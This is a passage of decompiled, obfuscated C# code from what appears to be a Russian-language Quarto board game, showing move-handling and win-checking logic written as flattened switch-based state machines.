					continue;
				case 20u:
					flag = Form1.smethod_41((Control)(object)borderBox[num6, num5]) == Color.Blue;
					num = 299820486;
					continue;
				case 19u:
					if (board[num4, num3] == null)
					{
						num = 1677485462;
						num8 = 1677485462;
						continue;
					}
					goto IL_0075;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -2024756472) ^ 0x74F2197E;
					continue;
				case 17u:
					Paint_Board();
					num = ((int)num2 * -122316554) ^ 0x5AA5CF91;
					continue;
				case 16u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num6, num5]), num3 * size + 4, num4 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_45(graphics_);
					num = (int)(num2 * 1848030793) ^ -1825503424;
					continue;
				case 14u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = 1389924678;
						num12 = 1389924678;
					}
					else
					{
						num11 = 2095225936;
						num12 = 2095225936;
					}
					num = num11 ^ (int)(num2 * 1811696665);
					continue;
				}
				case 12u:
					num = ((int)num2 * -1424121536) ^ 0x1FBCE1A5;
					continue;
				case 11u:
					num4 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)((num2 * 742185032) ^ 0x771A9534);
						continue;
					}
					goto IL_0075;
				case 10u:
					num5 = 0;
					num = 314884943;
					continue;
				case 9u:
					flag2 = num6 < 4;
					num = 1237143152;
					continue;
				case 8u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -1410984648;
						num10 = -1410984648;
					}
					else
					{
						num9 = -1822949736;
						num10 = -1822949736;
					}
					num = num9 ^ ((int)num2 * -2052702818);
					continue;
				}
				case 7u:
				{
					int num7;
					if (num5 >= 4)
					{
						num = 788779368;
						num7 = 788779368;
					}
					else
					{
						num = 1921805558;
						num7 = 1921805558;
					}
					continue;
				}
				case 6u:
					num = ((int)num2 * -2132300979) ^ 0x10864125;
					continue;
				case 5u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -287166218) ^ 0x2BBE5019;
					continue;
				case 4u:
					num6++;
					num = (int)(num2 * 2147181859) ^ -965459901;
					continue;
				case 3u:
					num5++;
					num = 2061672805;
					continue;
				case 2u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -589343021) ^ 0x4A503593;
					continue;
				case 1u:
					num3 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 2119150009) ^ 0x3424A661);
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -710040913) ^ 0x3840BACD;
					continue;
				default:
					return;
				case 13u:
					break;
				case 15u:
					return;
					IL_0075:
					num = 1713883742;
					num8 = 1713883742;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_1176: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a4: Expected O, but got Unknown
		int num34 = default(int);
		int num37 = default(int);
		Graphics graphics_ = default(Graphics);
		int num13 = default(int);
		int num14 = default(int);
		int num33 = default(int);
		int num8 = default(int);
		int num17 = default(int);
		int num18 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		bool flag17 = default(bool);
		int num3 = default(int);
		bool flag2 = default(bool);
		int num47 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		int num7 = default(int);
		int num31 = default(int);
		bool flag20 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag18 = default(bool);
		bool flag = default(bool);
		int num40 = default(int);
		int num41 = default(int);
		int num42 = default(int);
		int num26 = default(int);
		Figurine[,] array = default(Figurine[,]);
		bool flag8 = default(bool);
		bool flag14 = default(bool);
		int num32 = default(int);
		int num6 = default(int);
		int num28 = default(int);
		bool flag10 = default(bool);
		bool flag9 = default(bool);
		bool flag19 = default(bool);
		bool flag16 = default(bool);
		bool flag11 = default(bool);
		bool flag3 = default(bool);
		bool flag5 = default(bool);
		bool flag12 = default(bool);
		bool flag4 = default(bool);
		bool flag7 = default(bool);
		bool flag15 = default(bool);
		bool flag13 = default(bool);
		bool flag6 = default(bool);
		while (true)
		{
			int num = -73186384;
			while (true)
			{
				uint num2;
				int num36;
				int num25;
				int num35;
				int num27;
				switch ((num2 = (uint)num ^ 0xE595F828u) % 178u)
				{
				case 177u:
					Form1.smethod_30((Control)(object)borderBox[num34, num37]);
					num = ((int)num2 * -28210953) ^ -2012607819;
					continue;
				case 176u:
					num = (int)((num2 * 1754296181) ^ 0x204D1568);
					continue;
				case 175u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num13 + 0.05f) * (float)size, ((float)num14 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -104468648) ^ 0x1F4381;
					continue;
				case 174u:
					Form1.smethod_5((Control)(object)borderBox[num33, num8], Color.LimeGreen);
					num = (int)((num2 * 1882758079) ^ 0x2D6F8B0B);
					continue;
				case 173u:
					num = ((int)num2 * -278371509) ^ -213157192;
					continue;
				case 172u:
					board[num17, num18] = new Figurine(storage[num9, num10]);
					storage[num9, num10] = null;
					num = ((int)num2 * -2059081855) ^ 0x6F6ABCA7;
					continue;
				case 171u:
					Form1.smethod_15(timer1);
					num = -1466140836;
					continue;
				case 170u:
					flag17 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)((num2 * 2061007307) ^ 0x1EC675F5);
					continue;
				case 169u:
				{
					int num52;
					if (num14 >= 4)
					{
						num = -1225944240;
						num52 = -1225944240;
					}
					else
					{
						num = -860577136;
						num52 = -860577136;
					}
					continue;
				}
				case 168u:
					num = ((int)num2 * -810732011) ^ -383706319;
					continue;
				case 167u:
					if (!Stop(board))
					{
						num = (int)(num2 * 1218032326) ^ -864320300;
						continue;
					}
					goto IL_01b8;
				case 166u:
					num3++;
					flag2 = false;
					num = -1082919786;
					continue;
				case 165u:
					num47 = 0;
					num = -917703552;
					continue;
				case 164u:
					num36 = ((num3 < 9) ? 1 : 0);
					goto IL_01fa;
				case 163u:
					Form1.smethod_20(pictureBox[num9, num10], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num9, num10]);
					num = ((int)num2 * -1050747713) ^ 0x298C28CD;
					continue;
				case 162u:
				{
					array3[num7, num31] = new Figurine(storage[num34, num37]);
					int num66;
					int num67;
					if (!Stop(array3))
					{
						num66 = 1099443353;
						num67 = 1099443353;
					}
					else
					{
						num66 = 556912703;
						num67 = 556912703;
					}
					num = num66 ^ ((int)num2 * -295499243);
					continue;
				}
				case 161u:
					num47++;
					num = (int)((num2 * 212445739) ^ 0x1E235ABE);
					continue;
				case 160u:
					if (!Standoff(board))
					{
						num = -1470851066;
						num25 = -1470851066;
						continue;
					}
					goto IL_01b8;
				case 159u:
					flag20 = Standoff(board);
					num = ((int)num2 * -291462011) ^ 0xD16E319;
					continue;
				case 158u:
				{
					int num59;
					if (array2[num7, num31] == null)
					{
						num = -1110925783;
						num59 = -1110925783;
					}
					else
					{
						num = -1890691940;
						num59 = -1890691940;
					}
					continue;
				}
				case 157u:
					num = -1445177084;
					continue;
				case 156u:
					num14++;
					num = ((int)num2 * -823756723) ^ -1842306801;
					continue;
				case 155u:
					num = (int)(num2 * 457618043) ^ -1588461623;
					continue;
				case 154u:
					num = -1303134573;
					continue;
				case 153u:
				{
					int num53;
					int num54;
					if (flag18)
					{
						num53 = 923040478;
						num54 = 923040478;
					}
					else
					{
						num53 = 837380418;
						num54 = 837380418;
					}
					num = num53 ^ ((int)num2 * -135720075);
					continue;
				}
				case 152u:
					flag = Standoff(board);
					num = -351633534;
					continue;
				case 151u:
					num40 = 0;
					num = ((int)num2 * -1332610622) ^ -554408111;
					continue;
				case 150u:
					num = ((int)num2 * -1068731616) ^ -1495425176;
					continue;
				case 149u:
					num41 = 0;
					num42 = 0;
					num = (int)((num2 * 434024849) ^ 0x2E227B62);
					continue;
				case 148u:
					Form1.smethod_7((Control)(object)pictureBox[num26, num47], bool_0: true);
					num = -1605444422;
					continue;
				case 147u:
					num = (int)((num2 * 1761231826) ^ 0x76B4A01);
					continue;
				case 146u:
					num = ((int)num2 * -1902252731) ^ -527313918;
					continue;
				case 145u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -163473200) ^ 0xD3D6E3D;
					continue;
				case 144u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 595019840) ^ -1190755616;
					continue;
				case 143u:
					flag8 = board[num14, num13] == null;
					num = -438536970;
					continue;
				case 142u:
					num7 = 0;
					num = (int)(num2 * 1217337275) ^ -371953123;
					continue;
				case 141u:
					flag14 = num32 < 4;
					num = -1520569694;
					continue;
				case 140u:
					board[num40, num6] = new Figurine(storage[num41, num42]);
					storage[num41, num42] = null;
					num = (int)(num2 * 1829746828) ^ -1692132084;
					continue;
				case 139u:
					num = ((int)num2 * -1441427748) ^ -199354791;
					continue;
				case 138u:
					num37 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1560462219) ^ -349586207;
					continue;
				case 137u:
					Form1.smethod_30((Control)(object)borderBox[num28, num32]);
					num = ((int)num2 * -624825105) ^ 0x2EE61B8D;
					continue;
				case 136u:
					num = (int)((num2 * 1540866132) ^ 0x6C41ECBF);
					continue;
				case 135u:
					num = -1403032180;
					continue;
				case 134u:
					num = ((int)num2 * -2103722278) ^ -2061868825;
					continue;
				case 133u:
					flag10 = num31 < 4;
					num = -1206332538;
					continue;
				case 132u:
					num = ((int)num2 * -1302658127) ^ 0x54FE3884;
					continue;
				case 131u:
					num = ((int)num2 * -1219070345) ^ 0x2D47EC67;
					continue;
				case 130u:
					flag9 = num28 < 4;
					num = -1220378999;
					continue;
				case 129u:
					num = (int)(num2 * 998977586) ^ -1804189861;
					continue;
				case 128u:
				{
					int num21;
					int num22;
					if (!flag8)
					{
						num21 = -950539288;
						num22 = -950539288;
					}
					else
					{
						num21 = -724372696;
						num22 = -724372696;
					}
					num = num21 ^ ((int)num2 * -955120046);
					continue;
				}
				case 127u:
					Form1.smethod_30((Control)(object)pictureBox[num9, num10]);
					num = (int)(num2 * 1464873090) ^ -432297502;
					continue;
				case 126u:
					num = ((int)num2 * -1836458518) ^ -413074645;
					continue;
				case 125u:
					num = (int)(num2 * 817828629) ^ -1585090548;
					continue;
				case 124u:
					num17 = Form1.smethod_33(rnd, 4);
					num18 = Form1.smethod_33(rnd, 4);
					num = -109825846;
					continue;
				case 122u:
					num = (int)((num2 * 1108010077) ^ 0x295A5C9A);
					continue;
				case 121u:
					num = ((int)num2 * -2131740036) ^ -882393063;
					continue;
				case 120u:
					num = (int)((num2 * 1681950048) ^ 0x4C6C6008);
					continue;
				case 119u:
					num6 = 0;
					num = ((int)num2 * -49269655) ^ 0x5C4D0E08;
					continue;
				case 118u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -349854588) ^ -1072120596;
					continue;
				case 117u:
					flag2 = true;
					num = ((int)num2 * -1635561385) ^ -247463608;
					continue;
				case 116u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 426819990) ^ -97154299;
					continue;
				case 115u:
				{
					int num70;
					int num71;
					if (flag19)
					{
						num70 = 242641063;
						num71 = 242641063;
					}
					else
					{
						num70 = 703322576;
						num71 = 703322576;
					}
					num = num70 ^ (int)(num2 * 1801948541);
					continue;
				}
				case 114u:
					num = ((int)num2 * -1889547071) ^ -423338488;
					continue;
				case 113u:
					num42 = num32;
					Form1.smethod_5((Control)(object)borderBox[num28, num32], Color.White);
					num = (int)((num2 * 1745012033) ^ 0x70BCE09A);
					continue;
				case 112u:
					num34 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1019478964) ^ 0x7AA86CA;
					continue;
				case 111u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 129092075) ^ -975804468;
					continue;
				case 110u:
					num = (int)(num2 * 1918501832) ^ -1474375389;
					continue;
				case 109u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1699809046) ^ -1662990392;
					continue;
				case 108u:
					num = -1390578343;
					continue;
				case 107u:
					num32 = 0;
					num = -1508658689;
					continue;
				case 106u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.White);
					num = (int)((num2 * 1037237643) ^ 0x2C6A6EB6);
					continue;
				case 105u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -790580210) ^ -943038065;
					continue;
				case 104u:
					num26++;
					num = (int)((num2 * 33190827) ^ 0x1FF5B44B);
					continue;
				case 103u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1509580804) ^ -420787208;
					continue;
				case 102u:
					Form1.smethod_20(pictureBox[num28, num32], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num28, num32]);
					num = (int)((num2 * 1677845443) ^ 0x1BA44E21);
					continue;
				case 101u:
					num = (int)((num2 * 1003525077) ^ 0x2A0D8724);
					continue;
				case 100u:
					num = (int)(num2 * 204384096) ^ -1988028923;
					continue;
				case 99u:
				{
					int num68;
					int num69;
					if (flag16)
					{
						num68 = 260471404;
						num69 = 260471404;
					}
					else
					{
						num68 = 312909922;
						num69 = 312909922;
					}
					num = num68 ^ (int)(num2 * 875424616);
					continue;
				}
				case 98u:
				{
					int num64;
					int num65;
					if (flag14)
					{
						num64 = -625488384;
						num65 = -625488384;
					}
					else
					{
						num64 = -1994694587;
						num65 = -1994694587;
					}
					num = num64 ^ (int)(num2 * 642256174);
					continue;
				}
				case 97u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -1004427529) ^ -568331101;
					continue;
				case 96u:
					Paint_Board();
					num = (int)((num2 * 1888232744) ^ 0x4CEF015A);
					continue;
				case 95u:
					num = ((int)num2 * -724236247) ^ -1687830703;
					continue;
				case 94u:
					Form1.smethod_7((Control)(object)pictureBox[num33, num8], bool_0: false);
					num = -784306852;
					continue;
				case 93u:
					num = ((int)num2 * -1084912156) ^ -970429357;
					continue;
				case 92u:
					num = (int)(num2 * 239542894) ^ -405414749;
					continue;
				case 91u:
					num31 = 0;
					num = -510680697;
					continue;
				case 90u:
					Form1.smethod_20(pictureBox[num9, num10], (Image)null);
					num = (int)((num2 * 1990788254) ^ 0x145E0139);
					continue;
				case 89u:
					num = ((int)num2 * -1817484586) ^ -593021464;
					continue;
				case 88u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1259798444) ^ -1240026404;
					continue;
				case 87u:
					num32++;
					num = ((int)num2 * -2027897755) ^ -1932691350;
					continue;
				case 86u:
				{
					int num62;
					int num63;
					if (!flag20)
					{
						num62 = -1215800674;
						num63 = -1215800674;
					}
					else
					{
						num62 = -1300365936;
						num63 = -1300365936;
					}
					num = num62 ^ ((int)num2 * -1743517481);
					continue;
				}
				case 85u:
					num28 = 0;
					num = ((int)num2 * -1492247241) ^ -2058813535;
					continue;
				case 84u:
					num35 = ((num37 == num10) ? 1 : 0);
					goto IL_0aaa;
				case 83u:
				{
					int num60;
					int num61;
					if (!flag11)
					{
						num60 = 561080666;
						num61 = 561080666;
					}
					else
					{
						num60 = 2074826082;
						num61 = 2074826082;
					}
					num = num60 ^ (int)(num2 * 330252599);
					continue;
				}
				case 82u:
					num27 = (Standoff(array) ? 1 : 0);
					goto IL_0ae7;
				case 81u:
					storage[num9, num10] = null;
					num = ((int)num2 * -382020682) ^ 0x3C1AFDEB;
					continue;
				case 80u:
				{
					int num57;
					int num58;
					if (!flag3)
					{
						num57 = 831368812;
						num58 = 831368812;
					}
					else
					{
						num57 = 1113867983;
						num58 = 1113867983;
					}
					num = num57 ^ ((int)num2 * -2032131760);
					continue;
				}
				case 79u:
					num41 = num28;
					num = (int)(num2 * 531165107) ^ -1331436506;
					continue;
				case 78u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 2064622099) ^ -1951649265;
					continue;
				case 77u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = (int)((num2 * 2029889792) ^ 0x6626A4E8);
					continue;
				case 76u:
					flag5 = num13 < 4;
					num = -697930647;
					continue;
				case 75u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num17, num18] = new Figurine(storage[num9, num10]);
					num = (int)((num2 * 908187237) ^ 0x3D6E0BAB);
					continue;
				case 74u:
				{
					int num55;
					int num56;
					if (flag12)
					{
						num55 = -1758526032;
						num56 = -1758526032;
					}
					else
					{
						num55 = -588744482;
						num56 = -588744482;
					}
					num = num55 ^ (int)(num2 * 1653746555);
					continue;
				}
				case 73u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1071461267) ^ 0x2BFE46C6;
					continue;
				case 72u:
					flag19 = Form1.smethod_41((Control)(object)borderBox[num33, num8]) == Color.Red;
					num = (int)((num2 * 1006384295) ^ 0x4FBA7D2F);
					continue;
				case 71u:
					num = ((int)num2 * -845892807) ^ 0x1CBA97F6;
					continue;
				case 69u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num18 + 0.05f) * (float)size, ((float)num17 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -156106352) ^ -522422834;
					continue;
				case 68u:
					num9 = num33;
					num10 = num8;
					num = ((int)num2 * -1675324133) ^ 0x44F757F0;
					continue;
				case 67u:
					num7++;
					num = (int)(num2 * 877546475) ^ -367506;
					continue;
				case 66u:
				{
					int num50;
					int num51;
					if (flag4)
					{
						num50 = -2042454212;
						num51 = -2042454212;
					}
					else
					{
						num50 = -773062718;
						num51 = -773062718;
					}
					num = num50 ^ ((int)num2 * -469480489);
					continue;
				}
				case 65u:
				{
					int num48;
					int num49;
					if (flag17)
					{
						num48 = 1220262326;
						num49 = 1220262326;
					}
					else
					{
						num48 = 1925523387;
						num49 = 1925523387;
					}
					num = num48 ^ (int)(num2 * 1945443432);
					continue;
				}
				case 64u:
					flag7 = num33 < 4;
					num = -1940378945;
					continue;
				case 63u:
					num26 = 0;
					num = ((int)num2 * -381275192) ^ 0x2B599F35;
					continue;
				case 62u:
					Form1.smethod_30((Control)(object)borderBox[num9, num10]);
					num = ((int)num2 * -926875306) ^ 0x7E742FCA;
					continue;
				case 61u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.White);
					num = ((int)num2 * -301656352) ^ -520468262;
					continue;
				case 60u:
					num = (int)((num2 * 166182220) ^ 0x1A5A1DBD);
					continue;
				case 59u:
					Form1.smethod_5((Control)(object)borderBox[num34, num37], Color.Blue);
					num = ((int)num2 * -888298195) ^ -267297516;
					continue;
				case 58u:
					num13 = 0;
					num = -225291282;
					continue;
				case 57u:
					flag16 = num47 < 4;
					num = -449589889;
					continue;
				case 56u:
					num9 = 0;
					num = ((int)num2 * -1024603659) ^ 0x694035A9;
					continue;
				case 55u:
					num = (int)(num2 * 1249529692) ^ -1724138711;
					continue;
				case 54u:
					num33++;
					num = (int)(num2 * 298495359) ^ -418294494;
					continue;
				case 53u:
				{
					int num45;
					int num46;
					if (flag15)
					{
						num45 = -132431168;
						num46 = -132431168;
					}
					else
					{
						num45 = -1897853838;
						num46 = -1897853838;
					}
					num = num45 ^ (int)(num2 * 1083987289);
					continue;
				}
				case 52u:
					num = ((int)num2 * -527639498) ^ 0x4461984;
					continue;
				case 51u:
					if (storage[num34, num37] != null)
					{
						num = ((int)num2 * -341160871) ^ 0x5E0A85F;
						continue;
					}
					num35 = 1;
					goto IL_0aaa;
				case 50u:
					num = (int)((num2 * 360141117) ^ 0x7A8E467B);
					continue;
				case 49u:
					num = -796853444;
					continue;
				case 48u:
					num40 = num28;
					num6 = num32;
					num = ((int)num2 * -468541342) ^ -1595330150;
					continue;
				case 47u:
					step++;
					num = (int)(num2 * 1679508271) ^ -392795267;
					continue;
				case 46u:
				{
					int num43;
					int num44;
					if (flag10)
					{
						num43 = -973032292;
						num44 = -973032292;
					}
					else
					{
						num43 = -1085870139;
						num44 = -1085870139;
					}
					num = num43 ^ ((int)num2 * -135330880);
					continue;
				}
				case 45u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = -1384025245;
					continue;
				case 44u:
					num = ((int)num2 * -194031853) ^ 0x37666883;
					continue;
				case 43u:
					num = (int)(num2 * 1081604756) ^ -1748975546;
					continue;
				case 42u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -1153980068) ^ 0xB34D1ED;
					continue;
				case 41u:
					num = (int)((num2 * 2113102568) ^ 0x62E04FAB);
					continue;
				case 40u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num9, num10]), num18 * size + 4, num17 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -263552390) ^ 0x6D1040A9;
					continue;
				case 39u:
					num28++;
					num = ((int)num2 * -557727654) ^ 0x61B318CE;
					continue;
				case 38u:
				{
					int num38;
					int num39;
					if (!flag13)
					{
						num38 = 1379981159;
						num39 = 1379981159;
					}
					else
					{
						num38 = 1982476114;
						num39 = 1982476114;
					}
					num = num38 ^ ((int)num2 * -1239488204);
					continue;
				}
				case 37u:
					if (!flag2)
					{
						num = (int)(num2 * 1488515494) ^ -831812416;
						continue;
					}
					num36 = 1;
					goto IL_01fa;
				case 36u:
					num = ((int)num2 * -1554336732) ^ -449690589;
					continue;
				case 35u:
					num10 = 0;
					num33 = 0;
					num = ((int)num2 * -263199942) ^ 0x21D20798;
					continue;
				case 34u:
					if (num34 == num9)
					{
						num = ((int)num2 * -195378846) ^ -1323529174;
						continue;
					}
					num35 = 0;
					goto IL_0aaa;
				case 33u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1667542275) ^ 0x42BF72A0;
					continue;
				case 32u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -673054940) ^ -1438929966;
					continue;
				case 31u:
					num = -1890691940;
					continue;
				case 30u:
					num8++;
					num = (int)(num2 * 1411828509) ^ -1590779308;
					continue;
				case 29u:
					flag12 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num32 * size + size / 2, (int)(((float)num28 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -975181716;
					continue;
				case 28u:
					num = ((int)num2 * -901728411) ^ 0x1C513E01;
					continue;
				case 27u:
					Form1.smethod_30((Control)(object)borderBox[num33, num8]);
					num = (int)((num2 * 1586853618) ^ 0x7406D110);
					continue;
				case 26u:
					Form1.smethod_47(1000);
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num14 = 0;
					num = ((int)num2 * -1640436493) ^ 0x30AD6F57;
					continue;
				case 25u:
					num = ((int)num2 * -404692172) ^ 0x5DB6AC4D;
					continue;
				case 24u:
					num31++;
					num = -510680697;
					continue;
				case 23u:
					num = (int)(num2 * 1872990458) ^ -1769201307;
					continue;
				case 22u:
					flag11 = Form1.smethod_41((Control)(object)borderBox[num28, num32]) == Color.Blue;
					num = -1559276079;
					continue;
				case 21u:
				{
					int num29;
					int num30;
					if (flag9)
					{
						num29 = 1845417037;
						num30 = 1845417037;
					}
					else
					{
						num29 = 1869757228;
						num30 = 1869757228;
					}
					num = num29 ^ ((int)num2 * -620845706);
					continue;
				}
				case 20u:
					board[num14, num13] = new Figurine(storage[num9, num10]);
					num = ((int)num2 * -347334317) ^ 0x35FA00A7;
					continue;
				case 19u:
					num = (int)((num2 * 777031676) ^ 0x5DEED919);
					continue;
				case 18u:
					array[num14, num13] = new Figurine(storage[num9, num10]);
					if (!Stop(array))
					{
						num = (int)((num2 * 596063977) ^ 0x363FF474);
						continue;
					}
					num27 = 1;
					goto IL_0ae7;
				case 17u:
					flag6 = num26 < 4;
					num = -2127173065;
					continue;
				case 16u:
				{
					int num23;
					int num24;
					if (board[num17, num18] == null)
					{
						num23 = 1579468513;
						num24 = 1579468513;
					}
					else
					{
						num23 = 698329000;
						num24 = 698329000;
					}
					num = num23 ^ (int)(num2 * 918001747);
					continue;
				}
				case 15u:
				{
					int num19;
					int num20;
					if (!flag7)
					{
						num19 = -260344871;
						num20 = -260344871;
					}
					else
					{
						num19 = -1588054970;
						num20 = -1588054970;
					}
					num = num19 ^ (int)(num2 * 912811665);
					continue;
				}
				case 14u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1279230729) ^ -1541923727;
					continue;
				case 13u:
				{
					int num15;
					int num16;
					if (flag6)
					{
						num15 = 524111349;
						num16 = 524111349;
					}
					else
					{
						num15 = 1069377189;
						num16 = 1069377189;
					}
					num = num15 ^ (int)(num2 * 1289508986);
					continue;
				}
				case 12u:
					num = ((int)num2 * -2121111780) ^ -926745365;
					continue;
				case 11u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num9, num10]), num13 * size + 4, num14 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -907123218) ^ -1572678502;
					continue;
				case 10u:
					num13++;
					num = -1693168036;
					continue;
				case 9u:
				{
					int num11;
					int num12;
					if (!flag5)
					{
						num11 = -1761179941;
						num12 = -1761179941;
					}
					else
					{
						num11 = -1941744852;
						num12 = -1941744852;
					}
					num = num11 ^ (int)(num2 * 775788301);
					continue;
				}
				case 8u:
					Form1.smethod_30((Control)(object)borderBox[num9, num10]);
					num = (int)(num2 * 1958788658) ^ -1533628312;
					continue;
				case 7u:
					num = -1926252300;
					continue;
				case 6u:
					flag4 = num8 < 4;
					num = -1152517558;
					continue;
				case 5u:
					num8 = 0;
					num = -650378631;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -794530517;
					continue;
				case 3u:
					flag3 = num7 < 4;
					num = -835543974;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -2144636632;
						num5 = -2144636632;
					}
					else
					{
						num4 = -858170400;
						num5 = -858170400;
					}
					num = num4 ^ (int)(num2 * 2058771970);
					continue;
				}
				case 1u:
					num = ((int)num2 * -1441837494) ^ 0x284EA4F3;
					continue;
				case 0u:
					num3 = 0;
					num = (int)((num2 * 534758678) ^ 0x37B6EF12);
					continue;
				default:
					return;
				case 123u:
					break;
				case 70u:
					return;
					IL_01b8:
					num = -785131156;
					num25 = -785131156;
					continue;
					IL_0ae7:
					flag15 = (byte)num27 != 0;
					num = -2028098613;
					continue;
					IL_0aaa:
					flag18 = (byte)num35 != 0;
					num = -1020211211;
					continue;
					IL_01fa:
					flag13 = (byte)num36 != 0;
					num = -1577133252;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1971871970;
			while (true)
			{
				uint num2;
				int num13;
				int num34;
				switch ((num2 = (uint)num ^ 0x2F1A6FB3u) % 75u)
				{
				case 74u:
				{
					int num22;
					int num23;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num22 = 1201138912;
						num23 = 1201138912;
					}
					else
					{
						num22 = 1962465387;
						num23 = 1962465387;
					}
					num = num22 ^ (int)(num2 * 795356887);
					continue;
				}
				case 73u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -134722712) ^ -1310266220;
						continue;
					}
					goto IL_0064;
				case 72u:
				{
					int num32;
					if (num5 < 4)
					{
						num = 1941173151;
						num32 = 1941173151;
					}
					else
					{
						num = 1094935212;
						num32 = 1094935212;
					}
					continue;
				}
				case 71u:
				{
					int num9;
					int num10;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num9 = -1942473461;
						num10 = -1942473461;
					}
					else
					{
						num9 = -405291123;
						num10 = -405291123;
					}
					num = num9 ^ ((int)num2 * -256894924);
					continue;
				}
				case 70u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -830711845) ^ 0x4F55D936;
						continue;
					}
					goto IL_0106;
				case 69u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -1995419687) ^ -977262620;
						continue;
					}
					goto IL_0112;
				case 68u:
					flag2 = true;
					num = ((int)num2 * -781268912) ^ 0x1679C6A6;
					continue;
				case 67u:
				{
					int num68;
					int num69;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num68 = 1077703084;
						num69 = 1077703084;
					}
					else
					{
						num68 = 691291953;
						num69 = 691291953;
					}
					num = num68 ^ ((int)num2 * -1041360929);
					continue;
				}
				case 66u:
				{
					int num63;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 1793412365;
						num63 = 1793412365;
					}
					else
					{
						num = 2099595449;
						num63 = 2099595449;
					}
					continue;
				}
				case 65u:
				{
					int num46;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 1621906734;
						num46 = 1621906734;
					}
					else
					{
						num = 631578729;
						num46 = 631578729;
					}
					continue;
				}
				case 64u:
				{
					int num41;
					int num42;
